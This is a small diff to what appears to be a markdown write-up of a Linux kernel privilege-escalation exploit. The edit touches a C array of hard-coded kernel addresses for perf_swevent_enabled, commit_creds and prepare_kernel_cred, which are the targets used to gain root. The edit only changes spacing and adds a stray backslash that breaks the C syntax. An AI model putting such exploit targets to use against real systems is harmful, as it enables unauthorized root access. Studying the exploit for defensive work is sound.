@@ -233,9 +233,9 @@ Another 2 placeholders are marked to be replaced with addresses of commit\_creds
 
 ```c
 uint64_t targets[3][3] =
-            {{0xffffffff81ef67e0,  // perf_swevent_enabled
+           { {0xffffffff81ef67e0,  // perf_swevent_enabled
               0xffffffff81091630,  // commit_creds
-              0xffffffff810918e0}, // prepare_kernel_cred
+              0xffffffff810918e0\}, // prepare_kernel_cred
              
 /.../
 
